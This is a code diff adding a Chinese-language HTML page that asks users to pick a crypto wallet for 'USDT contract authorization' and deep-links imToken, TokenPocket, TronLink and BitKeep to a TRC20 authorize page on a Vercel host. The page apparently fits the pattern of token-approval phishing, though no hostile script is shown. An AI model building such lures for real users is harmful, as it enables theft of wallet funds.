@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT 合约授权跳转页</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f9f9f9;
+      padding: 30px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    .wallet-button {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #fff;
+      padding: 15px 20px;
+      margin: 10px auto;
+      max-width: 400px;
+      border-radius: 8px;
+      box-shadow: 0 0 8px rgba(0,0,0,0.05);
+      text-decoration: none;
+      color: #333;
+    }
+    .wallet-button img {
+      width: 32px;
+      height: 32px;
+      margin-right: 12px;
+    }
+    .wallet-button span {
+      flex: 1;
+      text-align: left;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <h2>请选择钱包进行 USDT 合约授权</h2>
+
+  <a class="wallet-button" href="imtokenv2://navigate?url=https%3A%2F%2Forder-demo-one.vercel.app%2Ftrc20_authorize_live.html">
+    <img src="https://raw.githubusercontent.com/TrustWallet/tokens/master/images/imtoken.png" alt="imToken">
+    <span>imToken 一键打开</span>
+  </a>
+
+  <a class="wallet-button" href="tpdapp://open?url=https%3A%2F%2Forder-demo-one.vercel.app%2Ftrc20_authorize_live.html">
+    <img src="https://raw.githubusercontent.com/TP-Lab/tp-dapp-icons/main/tokenpocket.png" alt="TokenPocket">
+    <span>TokenPocket 一键打开</span>
+  </a>
+
+  <a class="wallet-button" href="tronlink://dapp?url=https%3A%2F%2Forder-demo-one.vercel.app%2Ftrc20_authorize_live.html">
+    <img src="https://raw.githubusercontent.com/TP-Lab/tp-dapp-icons/main/tronlink.png" alt="TronLink">
+    <span>TronLink 一键打开</span>
+  </a>
+
+  <a class="wallet-button" href="bitkeep://dappbrowser/open?url=https%3A%2F%2Forder-demo-one.vercel.app%2Ftrc20_authorize_live.html">
+    <img src="https://raw.githubusercontent.com/TP-Lab/tp-dapp-icons/main/bitkeep.png" alt="BitKeep">
+    <span>BitKeep 一键打开</span>
+  </a>
+
+</body>
+</html>
